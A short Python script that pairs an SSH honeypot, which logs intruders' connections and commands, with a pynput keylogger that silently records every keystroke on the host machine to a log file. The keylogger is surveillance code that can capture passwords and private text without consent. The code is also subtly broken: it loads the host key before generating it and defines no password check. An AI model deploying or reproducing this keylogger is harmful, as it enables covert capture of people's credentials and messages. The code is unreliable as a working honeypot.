import paramiko
import socket
import threading
import logging
from pynput import keyboard
import os

# Configure logging
logging.basicConfig(filename='combined_tool.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# SSH server configuration
HOST_KEY = paramiko.RSAKey(filename='test_rsa.key')
SSH_PORT = 2222

class SSHServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_exec_request(self, channel, command):
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

def handle_connection(client_socket):
    transport = paramiko.Transport(client_socket)
    transport.add_server_key(HOST_KEY)
    server = SSHServer()
    try:
        transport.start_server(server=server)
    except paramiko.SSHException:
        return

    channel = transport.accept(20)
    if channel is None:
        return

    # Log the connection details
    logging.info(f"Connection from {client_socket.getpeername()}")

    # Simulate a shell session
    channel.send("Welcome to the honeypot!\r\n")
    while True:
        channel.send("honeypot> ")
        try:
            command = channel.recv(1024).decode()
            logging.info(f"Command received: {command}")
            channel.send(f"Command '{command}' executed.\r\n")
        except Exception as e:
            logging.error(f"Error: {e}")
            break

    channel.close()

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', SSH_PORT))
    server_socket.listen(100)
    logging.info(f"Honeypot listening on port {SSH_PORT}")

    while True:
        client_socket, addr = server_socket.accept()
        logging.info(f"Accepted connection from {addr}")
        client_handler = threading.Thread(target=handle_connection, args=(client_socket,))
        client_handler.start()

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    # Generate an RSA key for the SSH server
    if not os.path.isfile('test_rsa.key'):
        key = paramiko.RSAKey.generate(2048)
        key.write_private_key_file('test_rsa.key')

    # Start the SSH honeypot server
    server_thread = threading.Thread(target=start_server)
    server_thread.start()

    # Start the keylogger
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()
